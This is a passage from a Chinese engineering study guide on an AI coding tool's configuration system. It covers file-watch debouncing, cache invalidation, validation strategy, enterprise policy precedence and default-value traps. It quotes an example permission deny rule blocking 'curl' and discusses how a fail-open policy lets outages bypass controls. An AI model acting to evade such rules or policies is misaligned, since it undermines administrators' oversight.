const FILE_STABILITY_THRESHOLD_MS = 1000;
```

一次"保存"在文件系统层面可能是多个写操作。如果每个都触发一次重载，
会在 1 秒内做几次完整的 5 源重读。做法是**防抖**：
每次事件都重置一个 1s 定时器，只有 1s 内没有新事件才真正处理。

**坑二：很多编辑器用 delete-and-recreate 保存 → 删除宽限期**（`:87-102`）

```ts
const DELETION_GRACE_MS = 1700;
```

Vim 的默认保存策略是写临时文件 → 删原文件 → 重命名。
从文件系统看，这是一次 `rename`（可能被解读为"文件被删了"）。
如果立刻按"配置文件被删除"处理，会短暂地退回全默认配置——
用户看到的是"存盘瞬间主题闪了一下"。

做法是：收到 `rename` 先等 1.7s，如果期间文件被重建（收到 `change` 事件），
就取消这个 pending 删除（`:74-79`）。

**坑三：自己写的文件不该通知自己 → 内部写入抑制**（`internal-writes.ts`）

`/theme dark` 会写 `settings.json`。如果这次写入触发变更通知：
清缓存 → 重读 5 个文件 → 通知所有订阅者。**功能上不错，但纯属浪费**，
而且在某些实现里会形成循环（订阅者收到通知后又写配置）。

做法是握手：写入方写文件**前**调 `markInternalWrite(path)`，
检测器处理事件时调 `consumeInternalWrite(path, 5000)`，命中就跳过。

`internal-writes.ts:23-33` 里有一条关键语义——**"消费"是一次性的**：

```ts
export function consumeInternalWrite(path: string, windowMs: number): boolean {
  const ts = timestamps.get(path);
  if (ts !== undefined && Date.now() - ts < windowMs) {
    timestamps.delete(path);      // ← 消费后删除
    return true;
  }
  return false;
}
```

注释写明理由：

> "消费"语义：一次 mark 只抑制一次通知——消费后删除时间戳，
> 否则**下一次真正的外部变更会被误判为内部写入而被忽略**。

**失效形态**：如果不删时间戳，那么在 5s 窗口内用户手改配置的那次真实变更会被静默吞掉。
症状是"我改了配置但没生效"，而且**只在你刚执行过持久化命令之后的 5 秒内发生**——
一个几乎不可能稳定复现的 bug。

**这个模块还有一个结构性设计值得注意**（`internal-writes.ts:7-9`）：
它是一个**独立叶子模块**，只为打破循环依赖——
写入侧（`settings.ts`）和检测侧（`change-detector.ts`）都只依赖它，互不依赖。
如果把 `markInternalWrite` 放在 `change-detector.ts` 里，
就会出现 `settings.ts → change-detector.ts → cache.ts → ...` 的环。

### 7.6 fanOut 的单生产者模式

`change-detector.ts:105-109`：

```ts
function fanOut(source: SettingSource): void {
  resetSettingsCache();                             // ① 先清缓存
  getLogger().info("SETTINGS", `检测到 ${source} 变更，缓存已刷新`);
  settingsChanged.emit("change", source);           // ② 再通知订阅者
}
```

**顺序不能反，而且清缓存必须在这一处而不是各订阅者里。**

假设有 5 个订阅者，每个收到通知后自己清一次缓存再读：

```
订阅者 A: 清缓存 → 读（5 次磁盘 I/O + 5 次 Zod 校验）
订阅者 B: 清缓存 → 读（又 5 次）
订阅者 C: 清缓存 → 读（又 5 次）
...
```

**N 个订阅者 = N 次完整重读。** 而先清后通知：

```
fanOut: 清缓存
订阅者 A: 读 → cache miss → 完整重读（5 次 I/O），填充缓存
订阅者 B: 读 → cache hit  → 零开销
订阅者 C: 读 → cache hit  → 零开销
```

**一次重读，N-1 次命中。** 这就是"单生产者"的含义：
**缓存失效这个动作只有一个地方有权做**。

顺序反了会怎样？先通知后清缓存 → 订阅者读到的是**旧值**，
然后缓存才被清掉 → 所有订阅者都基于变更前的配置做了决策。
这是个静默的正确性 bug，不是性能问题。

### 7.7 CC 侧多出来的东西：MDM 轮询与文件监听的混合

sid-code 的变更检测只有一种机制：`fs.watch` 监听文件。
CC 侧（CC 侧口径）多了一层：**注册表 / plist 的变更无法被文件监听捕获**，
所以对 MDM 设置用 **30 分钟轮询**。

**为什么是 30 分钟**：MDM 策略变更是低频事件（IT 管理员偶尔推一次），
而每次轮询要 spawn 子进程（`plutil` 或 `reg query`）。
30 分钟的延迟在企业场景完全可接受，而 30 秒的轮询会持续 spawn 子进程。

**这里有一条通用判据**：轮询间隔该多长，**由"这个东西多久变一次"决定，
而不是由"我希望多快知道"决定**。前者是事实，后者是愿望。
如果按愿望定间隔，会得到一个成本恒定支出、收益几乎为零的轮询器。

CC 侧还用了 `fs.watchFile`（stat 轮询）而不是 `fs.watch`（inotify/FSEvents）来监听
它的 config 文件，理由是**在 NFS / CIFS 等网络文件系统上 `fs.watch` 不可靠**。
sid-code 用的是 `fs.watch`——这是一个**已知的可用性权衡**：
本地文件系统上更高效，网络挂载的 home 目录下可能失效。

### 7.8 本章自检

- 不带缓存的一次 `getSettings()` 要做哪些步骤？最贵的是哪一步？
- 三级缓存各自解决什么问题？L2 的价值目前被利用了吗？
- L3 命中时为什么必须 clone？为什么这里要做双重保险？
- `clearCachedSource` 与 `setCachedSource(source, null)` 的区别是什么？误用的 bug 形态是什么？为什么单元测试测不出来？
- 为什么监听目录而不是文件？
- 稳定性检查、删除宽限期、内部写入抑制各挡什么坑？
- 为什么"消费"内部写入标记后必须删时间戳？不删的失效形态是什么？
- fanOut 为什么要先清缓存再通知？顺序反了是性能问题还是正确性问题？

## §8 校验与容错：为什么绝大多数情况不能 fail-fast

这一章讲配置系统里最需要**分寸感**的一处：出错了怎么办。
它没有唯一正确答案——但它有一条清晰的判据，而且这条判据可以机械应用。

### 8.1 先接受一个事实：配置一定会写错

一份配置有 80+ 个可配字段、5 个来源、若干嵌套层级。用户会：

- 把数字写成字符串（`"maxTokens": "32768"`）
- 拼错字段名（`"permisionMode"`，少一个 s）
- 用错枚举值（`"permissionMode": "always_allow"`，该用连字符）
- 在数组里塞错类型（`"deny": ["Bash(x)", { "tool": "Bash" }]`）
- JSON 少一个逗号

**这些不是异常情况，是常态。** 一个配置系统的容错策略，
决定的是"用户拼错一个字段时，他损失什么"。

### 8.2 三种错误处理策略的代价对比

| 策略 | 行为 | 用户损失 | 什么时候该用 |
| --- | --- | --- | --- |
| **fail-fast** | 抛错退出 | **整个工具不可用**，哪怕错的是个无关字段 | 极少数：不修就没法工作的字段 |
| **fail-open** | 记警告，该字段回退默认，其余照常 | 一个字段的行为不如预期 | 绝大多数字段 |
| **fail-closed** | 拒绝这次操作，但不影响其他 | 这一次操作没做成 | 不可逆的、安全相关的操作 |

**注意 fail-fast 与 fail-closed 不是一回事**，这两个词经常被混用：

- **fail-fast** = 出错立刻整体崩掉（作用域是**整个程序**）
- **fail-closed** = 出错时选择"不放行"这个分支（作用域是**这一次操作**）

一个 fail-closed 的写入函数抛错，程序不会退出——上层可以捕获、可以提示用户、可以跳过。
一个 fail-fast 的加载器抛错，用户直接看不到界面。

### 8.3 sid-code 的默认策略：fail-open + 结构化诊断

`config/schema.ts:113` 的 `validateConfig()` 返回的不是 `boolean`，而是：

```ts
{ errors: ValidationError[], warnings: ValidationWarning[] }
```

**返回而不抛**，这就是 fail-open 的形态。调用方（`config.ts:1565`）决定怎么处理。

而 `errors` 与 `warnings` 的分界也有判据（看几个真实例子）：

| 检查 | 归 error 还是 warning | 理由 |
| --- | --- | --- |
| `provider` 不在 4 个有效值内 | **error** | 后面的 LLM 调用完全走不通 |
| `model` 为空 | **error** | 同上 |
| `maxTokens` 不是数字 | **error** | 会传给 API 导致 400 |
| `maxTokens < 1000` | **error**（schema.ts:154） | 小到无法完成任何有意义的输出 |
| `maxTokens` **超过模型上下文窗口** | **warning**（schema.ts:170） | 见下面这条精彩的注释 |
| API key 像占位符（`your_api_key`） | warning | 可能用户就是想先跑通流程 |

`maxTokens > contextWindow` 那条的注释（`schema.ts:164-168`）值得完整读：

> 阈值取当前模型自己声明的上下文窗口，而不是硬编码 200000。
> 输出上限唯一真正不合理的情形是"超过模型上下文窗口"（物理上不可能输出比窗口还多）。
> 拿不到模型窗口时**不告警** —— maxTokens 多由系统按模型 `max_output_tokens` 自动推导，
> **用一个无关的硬编码数去警告系统自己的正确推导，只会制造首屏噪音。**

最后那句是个通用原则：**告警的成本不是零。** 一个总在无意义地告警的系统，
会训练用户忽略所有告警——**于是真正该看的那条也被忽略了**。
所以"拿不准就告警"是错的策略，正确策略是"拿不准就不告警"。

### 8.4 唯一的 fail-fast：两个字段

`config.ts:1577-1590`：

```ts
// 致命错误：provider / model 无效时必须立即阻止启动（不依赖 logger）。
// 这是"不修就跑不起来"的唯一该抛首屏的情形。
if (validation.errors.length > 0) {
  const hasFatalError = validation.errors.some(
    (e) => e.path === "provider" || e.path === "model",
  );
  if (hasFatalError) {
    throw new Error(`配置验证失败，存在致命错误，无法启动 (${detail})`);
  }
}
```

**80+ 个字段里只有 2 个会阻止启动。** 判据是注释里那句：**"不修就跑不起来"**。

用这条判据自检其他字段：

- `permissionMode` 写错 → 回退 `default`，工具能用（只是权限行为不如预期）→ 不该 fail-fast
- `mcpServers` 某个 server 配错 → 那个 server 连不上，其余照常 → 不该 fail-fast
- `hooks` 写错 → 那个 hook 不跑 → 不该 fail-fast
- `provider` 写错 → **第一次 LLM 调用就失败，工具什么也做不了** → fail-fast

> 💡 **面试可以直接用这个数字**：
> "我们 80 多个配置字段里，只有 2 个会阻止启动。判据是'不修就跑不起来'。"
> 这一句同时展示了策略、判据和实际比例，比说"我们用 fail-open"信息量大得多。

### 8.5 一个精细的容错设计：单条坏规则不毒化整个字段

`config/settings/validation.ts:64-88` 有一个 Zod **之前**执行的预过滤：

```ts
export function filterInvalidPermissionRules(data: any, filePath: string): ValidationError[] {
  for (const ruleType of ["allow", "deny", "ask"] as const) {
    const rules = data.permissions[ruleType];
    if (!Array.isArray(rules)) continue;
    data.permissions[ruleType] = rules.filter((rule: unknown) => {
      if (typeof rule !== "string") {
        warnings.push({ ..., message: `无效的权限规则（非字符串），已忽略` });
        return false;
      }
      return true;
    });
  }
}
```

**为什么需要它**：Zod 校验一个 `z.array(z.string())` 时，
数组里**一个**元素类型错，会让**整个 `permissions` 字段**校验失败。
于是用户在 deny 列表里手滑写了一个对象，**他所有的 deny 规则都会失效**。

这是最坏的一种失效形态：**安全规则静默全部失效，而用户看到的只是一条"某字段校验失败"的警告**。

预过滤把粒度从"整个字段"降到"单条规则"：坏规则剔除、记一条警告、其余照常生效。
判据是：**失效的粒度应该和错误的粒度相匹配。**
一条规则写错就只失效一条，不该连坐。

> ⚠️ **这个坑的通用形态**：任何时候你用 schema 校验一个**数组/集合**类型的安全配置，
> 都要问一句：**一个元素错，会让整个集合失效吗？** 如果会，那就需要预过滤。
> 这条在 schema-first 的项目里普遍存在，因为 schema 库天然是"整体校验"语义的。

### 8.6 一个漂亮的时序细节：诊断信息延迟输出

`config.ts:1567-1575`：

```ts
// 暂存校验诊断：此刻 logger 尚未 initLogger（仍是 enabled=false 的兜底实例，
// 会把 WARN 强制刷到 stderr 污染首屏、又吞掉 INFO/DEBUG 不落盘）。
// 故不在此直接打印，挂到 config 上由上层在 logger 就绪后统一输出。
config._validationDiagnostics = { warnings: [...], errors: [...] };
```

**问题**：配置校验发生在 logger 初始化**之前**——因为 logger 的配置（日志级别、
日志文件路径）本身来自配置。这是一个**鸡生蛋**：想记日志需要先读配置，
读配置的过程产生的日志无处可记。

**错误的解法**：在这里直接 `console.warn`。后果是这些警告绕过所有日志控制——
用户设了 `debugLevel: "ERROR"` 也照样刷到 stderr，污染 TUI 首屏。

**采用的解法**：把诊断信息**挂在 config 对象上**（`_validationDiagnostics`，
下划线前缀表示内部字段、不写盘），上层在 logger 就绪后统一输出。

**这是一个可迁移的模式**：当 A 依赖 B 而 B 的初始化过程会产生 A 类型的输出时，
把输出**缓冲**起来，等 A 就绪后回放。同样的模式在启动性能、错误上报里都能用。

### 8.7 passthrough：向前兼容与"拼错不报错"是同一枚硬币

`config/settings/types.ts` 的 schema 大量使用 `.passthrough()`
（实测 21 处，含所有嵌套 schema）。文件头注释（`types.ts:9-11`）写明理由：

> `.passthrough()` 保留未知字段——向前兼容（旧版本不认识的新字段不被删除）
> ⚠ **所有嵌套 schema 也必须加 `.passthrough()`**，否则 safeParse 后写回时会……

**两个后果，一好一坏，无法分离**：

| 后果 | 好处 | 坏处 |
| --- | --- | --- |
| schema 不认识的字段原样保留 | 旧版本读新版本写的配置不会删掉新字段（团队里版本不一致时的关键保障） | **字段名拼错不会报错，只会静默不生效** |

用户写 `"permisionMode": "always-allow"`（少一个 s）：passthrough 让它原样通过，
Zod 不报错，然后**没有任何代码读这个键**，于是它静默无效。
用户以为自己配好了权限模式。

**这不是 bug，是这个设计的必然代价。** 缓解手段有三条，成本递增：

1. **文档标注**（sid-code 官网参考页对 14 个 passthrough 字段标了⚠️
   "拼错不报错、只会静默不生效"）—— 成本最低，但依赖用户读文档
2. **未知键告警**：加载时把"不在 schema 声明里"的顶层键列出来提醒 ——
   会误报（用户可能刻意留了注释性字段，或者用的是更新版本的字段）
3. **编辑距离建议**："`permisionMode` 未知，你是不是想写 `permissionMode`？" ——
   体验最好，实现成本最高

sid-code 目前做的是 1。**这是一个合理但不完美的取舍**，
面试时值得作为"我们这套还能改进的地方"说出来。

### 8.8 fail-open / fail-closed 的判据总表

把前面散落的判据收成一张表。这张表是**本章最值得记住的东西**：

| 场景 | 策略 | 判据 |
| --- | --- | --- |
| 配置字段类型/枚举错 | fail-open | 影响范围仅该字段，回退默认可用 |
| `provider` / `model` 无效 | **fail-fast** | 不修就跑不起来 |
| 权限规则数组里单条坏规则 | fail-open（预过滤） | 失效粒度应匹配错误粒度 |
| 写配置时检测到明文凭证 | **fail-closed** | **不可逆**（密钥落盘即视为泄露） |
| 写配置时目标文件 JSON 损坏 | **fail-closed** | 不可逆（会覆盖用户全部配置） |
| 项目级 `.mcp.json` 审批状态为 pending | **fail-closed** | 未审批的外部进程连接是安全事件 |
| worktree 配置读取失败 | fail-open | "绝不因配置错误阻断 worktree 创建" |
| 企业策略文件读取失败 | 视场景 | 见 §9.5 —— 这一格没有标准答案 |

**读这张表的方法**：三个问题依次问下来。

1. **这个操作可逆吗？** 不可逆 → fail-closed
2. **不修它能不能继续工作？** 不能 → fail-fast
3. **失效的粒度和错误的粒度匹配吗？** 不匹配 → 加预过滤

### 8.9 本章自检

- fail-fast 与 fail-closed 的区别是什么？作用域分别是什么？
- 为什么 `maxTokens > contextWindow` 只是 warning，而 `maxTokens < 1000` 是 error？
- "拿不准就告警"为什么是错的策略？
- 80+ 字段里只有 2 个会阻止启动，判据是什么？
- 权限规则的预过滤解决什么问题？不做预过滤的最坏后果是什么？
- 配置校验发生在 logger 初始化之前，这个鸡生蛋问题怎么解？
- `.passthrough()` 的好处和坏处为什么无法分离？三条缓解手段的成本排序是？

## §9 企业管控：为什么这一层刻意不合并

前面八章的合并逻辑，到企业管控这一层**突然反转**：这一层不合并，用 first-source-wins。
这个反转是本章唯一的主题，它是面试里一个很好的深度问题。

### 9.1 企业管控要解决的三个问题

企业 IT 需要在**不修改用户文件**的前提下，强制推送策略到所有员工机器。三个具体需求：

1. **强制性**：用户不能通过改自己的配置绕过（所以优先级必须最高，见 §3.1）
2. **不可篡改性**：策略文件本身要放在用户没有写权限的位置（如 `/etc/`，需要 root）
3. **可归因性**：用户看到某个功能没了，应该知道是被管控禁的，而不是以为工具坏了

第 3 点常被忽略，但它是用户体验的关键。sid-code 的 `PolicySettings` 类型里
专门有一个 `reason` 字段（`config/policy.ts:22-30`），
由 `policy-limits.ts` 的 `getPolicyDenialReason()` **原样展示给用户**——
回答"为什么这个功能没了"。

**没有这个字段会怎样**：用户发现 hook 不工作了，会去查配置、查日志、
以为是 bug，最后花半小时才发现是公司禁了。而有了它，
提示信息可以是"hook 功能已被企业策略禁用：安全合规要求，如需使用请联系 IT"。

### 9.2 ★ first-source-wins：为什么不合并

企业策略有多个可能的下发通道。sid-code 定义了三个（`policy.ts:12`）：

```ts
export type PolicySource = "remote" | "mdm" | "managed_file";
```

CC 侧（CC 侧口径）有四个：Remote API、MDM（HKLM/plist）、`managed-settings.json`、HKCU。

**直觉做法是合并它们**——就像前面五个来源那样。但两边都选了
"**第一个有内容的来源胜出，其余全部忽略**"：

```ts
// policy.ts:130-140
async load(): Promise<PolicySettings | null> {
  for (const loader of this.loaders) {
    const settings = await loader.load();
    if (settings) {
      this.cachedSettings = settings;
      return settings;          // ← 找到就返回，不看后面的
    }
  }
  return null;
}
```

**理由（这是本章的核心）**：

> 这几个来源代表的是**同一个管理意图的不同传递通道**，
> 而不是**不同层级的配置叠加**。

展开说：user / project / local 这三层是**不同的人在表达不同层级的意图**
（我的偏好、团队的约定、我在这个项目上的例外）——它们叠加是有意义的。

而 remote / mdm / managed_file 是**同一个 IT 部门在用不同技术手段推同一份策略**。
企业不会"通过 MDM 推一半策略、通过 API 推另一半"——
他们会选一个通道，把完整策略推下去。

**如果合并会发生什么**（这是反面论证，面试时值得讲）：

假设 IT 在 2024 年通过 `managed-settings.json` 部署了一份策略，
2026 年改用远程 API 下发新策略。如果两者合并：

- 旧文件里的 `permissions.deny: ["Bash(curl *)"]` 还在
- 新 API 下发的策略里已经不禁 curl 了（业务需要）
- 合并结果：**curl 仍然被禁**，因为数组是拼接语义

IT 会发现"我明明在新系统里放开了，怎么还是不行"，
而根因是一台机器上三年前的残留文件。**这就是"意外的策略组合"。**

first-source-wins 的语义是：**新通道一旦有内容，旧通道彻底失效。**
这符合"切换通道"的真实语义。

### 9.3 通道优先级：越"活"的越优先

三个（CC 侧四个）通道的顺序不是随意的：

| 优先级 | 通道 | 生效速度 | 覆盖面 | 为什么排这个位置 |
| --- | --- | --- | --- | --- |
| 1（最高） | **Remote API** | 秒级 | 所有认证用户（含 BYOD） | 最新、最灵活；IT 用它做紧急调整 |
| 2 | **MDM**（plist / 注册表） | 小时~天级 | 公司管理的设备 | 比文件更难篡改（需要 MDM 基础设施） |
| 3 | **managed file** | 立即（但要人去部署） | 部署到的机器 | 最基础，也最容易过时 |
| 4（CC 侧） | HKCU（Windows 用户级注册表） | — | — | **用户可写**，所以垫底 |

**规律**：越"活"（越容易更新、越不容易过时）的通道优先级越高。
这和 first-source-wins 配合得很好——**IT 换到更好的通道后，旧通道自动失效**。

注意第 4 档（CC 侧）：`HKCU` 是用户可写的注册表位置，
所以它虽然在"policy"这一族里，却排在最低——它更像"用户自己模拟企业策略"的测试出口。
sid-code 有对应的东西：`~/.sid-code/managed-settings.json`（用户目录，用户可写），
排在 `/etc/sid-code/managed-settings.json` 之后（`paths.ts` 的 `managedPolicyCandidates()`）。

### 9.4 一个真实的实现债：两个策略路径并存

这是 `配置参考.md` §0.3 记录的一处**必须知道否则会配错**的现状：

| 谁在读 | 读哪个文件 |
| --- | --- |
| 链 B 的 `policySettings` 层（`settings/constants.ts:50`） | `/etc/sid-code/policy.json` |
| `PolicyManager` / 权限规则 / 扩展加载（`paths.ts` 的 `managedPolicyCandidates()`） | `/etc/sid-code/managed-settings.json` → `~/.sid-code/managed-settings.json` |

而 `paths.ts` 里明写「统一后**废弃** `/etc/sid-code/policy.json`」——**但两处仍并存**。

**后果**：同一份企业管控要**落两个文件**才能全面生效。
只配 `managed-settings.json` 的话，链 B 的 `policySettings` 层拿不到内容
（于是 policy 层的 settings 字段覆盖不生效，但权限规则和 policy-limits 生效）。

**这是一个典型的"迁移做了一半"形态**：新路径已经上线、老路径标了废弃，
但没有删除，也没有兼容读取。**最危险的部分是它的失效是部分的**——
配了一个文件之后"看起来生效了"（权限规则确实拦住了），
于是没人会去查另一半有没有生效。

> 💡 **可迁移的教训**：**废弃一个配置路径时，"标注废弃"和"实际停用"必须成对。**
> 只标注不停用，会得到一个"两个路径都半生效"的状态，比两个路径都完整生效更难排查。
> 正确做法是二选一：① 新路径读不到时回退读老路径（兼容层）；
> ② 或者在启动时检测老路径存在就告警"这个文件已废弃，请迁移到 X"。

### 9.5 fail-open vs fail-closed：企业策略这一格没有标准答案

§8.8 那张表里，"企业策略加载失败"那一格我写了"视场景"。这里展开。

假设远程 API 拉策略超时了。两个选择：

| 选择 | 后果 |
| --- | --- |
| **fail-open**（拿不到策略就当没有策略） | 网络抖动时企业管控**整体失效**。攻击面：断网 = 绕过所有管控 |
| **fail-closed**（拿不到策略就不让用） | 网络抖动时**工具完全不可用**。IT 的策略服务器挂了 = 全公司开发停摆 |

CC 侧（CC 侧口径）选了 **fail-open**，并明确记录了这个决策。理由是可用性：
策略服务器不可用不该导致所有人无法工作。

**但这个选择有前提**：CC 侧的 fail-open 是**在有磁盘缓存兜底**的情况下做的——
拉不到远程策略时用上次成功拉取的缓存值，而不是"当作没有策略"。
**这个区别是决定性的**：

```
纯 fail-open：    拉取失败 → 无策略 → 管控失效         ← 危险
缓存兜底 fail-open：拉取失败 → 用上次的策略 → 管控仍在  ← 可接受
```

只有在**从来没成功拉取过**（新机器 + 首次启动 + 网络不通）时，
后者才退化成前者。这个窗口小得多。

> ⚠️ **面试时这一题的正确答法**：不要直接答 fail-open 或 fail-closed。
> 先问"有没有缓存兜底"——**这个前提比选择本身更重要**。
> 一个没有缓存的 fail-open 是安全漏洞，一个有缓存的 fail-open 是合理权衡。

### 9.6 policy 层的能力边界：它管不了的六件事

`config/policy-limits.ts:8-19` 列了六个 feature 开关：
`hooks` / `bypass_permissions` / `auto_mode` / `sandbox_bypass` / `file_upload` / `network_access`。

`配置参考.md` §20 记录了一条事实：**这六个 feature 不由 `policy-limits` 模块把关**——
它只负责"查表 + 给理由"，真正的拦截要在各个功能的入口处自己调用。

**这是一个需要警惕的形态**：一个策略模块声明了六个能力开关，
但拦截点分散在六个不同的功能模块里。任何一个功能模块忘记查表，
那个开关就静默失效——**而策略文件里配了它、也不报错**。

这正是 §11 要讲的"配了不生效"的一个特例，而且是最危险的一类：
**安全开关的静默失效**。检验方法只有一条：**回源码找消费点**。

### 9.7 本章自检

- 企业管控的三个需求分别是什么？第三个（可归因性）为什么重要？
- first-source-wins 与 merge 的语义区别是什么？为什么策略层用前者？
- 举出一个"合并策略通道会导致意外组合"的具体场景。
- 通道优先级排序的规律是什么？为什么用户可写的通道垫底？
- sid-code 的两个策略路径并存导致什么后果？为什么"部分失效"比"完全失效"更难查？
- "企业策略拉取失败该 fail-open 还是 fail-closed"——回答前必须先问什么？
- `policy-limits` 的六个 feature 开关有什么结构性风险？

## §10 默认值是一等公民：四种默认值陷阱

大多数人把默认值当成"加载失败时的兜底"，一个 `?? fallback` 就完事。
**在多来源配置系统里，默认值是一个独立的设计维度**——它有自己的一整套陷阱，
每一种都在 sid-code 里留下过真实事故。

### 10.1 陷阱一：同一个字段有两个默认值定义点

sid-code 的 `debug` 字段有**两处默认值定义**，值相反：

| 定义点 | 值 |
| --- | --- |
| `config/config.ts:888`（`defaultConfig()`） | `debug: true`，`debugLevel: "DEBUG"` |
| `config/app-config.ts:132`（`createDefaultAppConfig()`） | `debug: false`，`debugLevel: "INFO"` |

两处都是"默认值"，都是活代码，**取哪一个取决于消费方走哪条链**：
读 `config.debug`（链 A，实测 `cli.ts` 里 10+ 处）拿到 `true`；
读 `getAppConfig().debug` 拿到 `false`。

**为什么会长成这样**：这是 §2.3 那两条并行加载链的必然产物。
两个系统各自维护自己的默认值集合，而 `debug` 这个字段**同时属于两边**
（它既是"用户想要的行为"，也是"应用自己的日志开关"）。

**失效形态**：一个 issue 里用户报"日志级别不对"，你去查 `defaultConfig()`
看到 `DEBUG`，觉得没问题；用户实际走的是 AppConfig 那条链拿到 `INFO`。
**两个人看同一份代码得出相反结论，而两人都没看错。**

> ⚠️ **可迁移的教训**：
> **默认值必须有唯一定义点。** 这和 §5.3 的"安全清单唯一权威源"是同一条原则的两个实例。
> 判据也一样：**两份"应该一样"的东西，迟早会不一样，而且不一样时不会有任何东西变红。**
>
> 正确形态是：一处定义 + 另一处引用（`debug: DEFAULTS.debug`）。
> 引用哪怕跨模块，也比复制一个字面量安全。

### 10.2 陷阱二：默认值被翻转，而文档还是旧的

`配置参考.md` 顶部记录了一件事：**在两个多月内有 5 个默认值被翻转**：

| 字段 | 旧默认 | 当前默认 |
| --- | --- | --- |
| `trace.enabled` | `false` | **`true`** |
| `alternateBuffer` | `false` | **`true`** |
| `toolSearch` | 不存在 / `false` | **`true`** |
| `debug` | `false` | **`true`**（链 A 侧） |
| `debugLevel` | `"INFO"` | **`"DEBUG"`**（链 A 侧） |

**照旧文档配置会得到相反行为。** 这不是文档写错，是**默认值翻转是一种破坏性变更，
但它长得不像破坏性变更**——代码 diff 上只是一个 `false` 改成 `true`。

**为什么默认值会被翻转**：因为默认值承载的是**产品判断**，而产品判断会变。
`toolSearch` 从关到开，是因为算清了"15 个长尾工具 + 所有 MCP 工具首轮不注入能省多少 token"；
`trace.enabled` 从关到开，是因为轨迹变成了四大方向的取数源——**没有轨迹就画不出曲线**。

这两个翻转都是对的。问题不在翻转，在于**没有机制让引用它的地方一起更新**。

**三条缓解手段**：

1. **从源码生成参考文档**（sid-code 有 `scripts/docs-gen-reference.ts`，
   pre-commit 用 `--check` 拦漂移）—— 最有效
2. **默认值集中定义 + 测试断言**（如超时阶梯的哨兵测试）
3. **文档里标注 `last_verified` 日期**，读者自己判断新鲜度 —— 成本最低，
   本文顶部就这么做的

> 💡 **面试信号**：被问到"你们文档怎么保证不过期"时，
> 答"从源码生成 + pre-commit 校验"比答"我们定期 review"强得多。
> 更强的答法是承认边界：**"生成器能保证字段表不漂移，但保证不了'这个字段的设计理由'不过期——
> 后者只能靠 review。"**

### 10.3 陷阱三：`0` / `[]` / `{}` 到底是"关闭"还是"没配"

这是本章最实用的一条，因为它直接影响你怎么写 schema。

看两个真实例子。

**例一：`maxSessionDurationMs` 的 `0`**

`config/settings/types.ts:190` 用了 `.nonnegative()` 而不是 `.positive()`：

```ts
maxSessionDurationMs: z.number().nonnegative().optional(),
```

`network-profile.ts:157` 的注释解释了为什么：

> 注意 `0` 是显式合法值（走 `readEnvNonNegative`），**不是"未设置"**。

语义区分：

| 用户写法 | 语义 |
| --- | --- |
| 省略这个字段 | "用默认"（默认是 `0` = 关闭） |
| 写 `0` | **"我明确要它关"** |
| 写 `7200000` | "我要 2 小时的上限" |

如果 schema 用 `.positive()`，那么**显式写 `0` 的配置会被 Zod 拒掉**——
用户明确表达"我要关闭"，系统告诉他"0 不是合法值"。

反过来，有些字段的 `0` **必须**被拒。同一个文件 `types.ts:106-121` 里，
`streamTimeouts` 的三项都用 `.positive()`，注释写明理由：

> 三项都 `.positive()`：`0` / 负数不是"关闭"（**关掉 idle 闸门会退回半开连接**……）

**判据出来了**：

> **`0` 该不该合法，取决于"关闭这个东西"是不是一个用户应该能做的选择。**
>
> - 关掉会话时长上限 → 合理选择（无人值守长任务需要）→ `.nonnegative()`
> - 关掉 idle 超时闸门 → 会退回半开连接永久挂起 → **不是合理选择** → `.positive()`

**例二：`worktree.symlinkDirectories: []`**

`worktree/config.ts:47-50`：

```ts
symlinkDirectories:
  Array.isArray(wt.symlinkDirectories) && wt.symlinkDirectories.length > 0
    ? wt.symlinkDirectories
    : DEFAULT_WORKTREE_CONFIG.symlinkDirectories,
```

**空数组会回落默认值**。所以用户写 `"symlinkDirectories": []` 想表达"我不要任何 symlink"——
**做不到**，他会得到默认的那几个目录。

对比 §6.4 的 `mergeMissingTopLevelKeys`，那里**明确把 `[]` 当"用户已表态"**：

> 用户把某数组显式设成 `[]`、某对象设成 `{}` 都算「用户已表态」，一律不覆盖。

**同一个仓库里两处对 `[]` 的语义处理相反。** 后者是刻意设计（有注释论证），
前者被 `配置参考.md` §20 列进了"配了不生效"清单。

> ⚠️ **写 schema 时的自检三问**（每个可选字段都过一遍）：
> 1. 省略它 = 什么语义？
> 2. 写"空值"（`0` / `""` / `[]` / `{}`）= 什么语义？和省略一样吗？
> 3. 如果不一样，**代码里怎么区分这两种情况？**
>
> 第 3 问最关键。在 TypeScript 里区分它们要用 `key in obj` 或 `!== undefined`，
> 而不是 truthiness 判断（`if (!value)` 会把 `0` / `""` / `[]` 都当成"没配"——
> 注意 `[]` 在 JS 里是 truthy，但 `.length > 0` 检查会把它当 falsy 处理，
> 这是 §10.3 例二那个 bug 的确切成因）。

### 10.4 陷阱四：合并时跳过 `undefined` 意味着"无法清空"

`config.ts` 的 `mergeConfig` 会**跳过 `undefined` 与空字符串**。
`配置参考.md` §0.2 记录了这条的后果：

> 所以想用环境变量把某字段**清空**是做不到的，写空串等于没写。

举例：`SID_CODE_LLM_BASE_URL=""` 表达"我要清掉配置文件里的 baseURL，用默认端点"。
实际效果：空串被跳过，配置文件里的值继续生效。

**这是一个刻意的权衡**，因为反过来也有问题：
如果空串不被跳过，那么 shell 里一个没赋值的变量（`export FOO=$UNSET_VAR` 得到空串）
就会静默清掉用户的配置。**在 shell 环境里，"空串"和"没设"极难区分**——
`process.env.FOO` 在两种情况下分别是 `""` 和 `undefined`，
但产生 `""` 的最常见原因恰恰是"变量没设对"，而不是"用户想清空"。

所以取舍是：**保护配置不被误清空 > 支持"用环境变量清空"这个罕见需求。**
需要清空时的正确做法是改配置文件（删掉那个键）。

### 10.5 一个正面案例：默认值的理由必须写下来

前面四条都是陷阱。这一条是正面的：**sid-code 有一个值得学的习惯——
默认值的选择理由写在定义点旁边**。

看 `maxTokens: 32768` 的注释（`config.ts:860-868`）：

> `maxTokens` 是「最后兜底」：正常路径下会被四重覆盖——
> `availableModels.maxOutputTokens` > CLI/env/file 显式值 > 模型推导。
> 仅当用户既没配 `availableModels`、也没在任何地方显式给 `maxTokens`、
> 且模型推导也失败时，才用到这里。
> 旧值 16384 是 Claude 3 时代输出上限，**会把今天 32K~128K 输出能力的模型阉割掉**；
> **不存在对所有模型都"安全且不阉割"的硬编码值**（各家 max_output 差异大），
> 故取一个主流模型普遍可接受、又不会过度保守的兜底。

这段注释回答了三个问题：**它什么时候才生效**（四重覆盖之后）、
**为什么不是旧值**（时代变了）、**为什么不追求完美**（不存在完美值）。

再看 `maxSessionDurationMs: 0` 的注释（`network-profile.ts:140-157`），
它给了三条理由 + 一个日期 + 一个"需要时怎么重开"的指引。

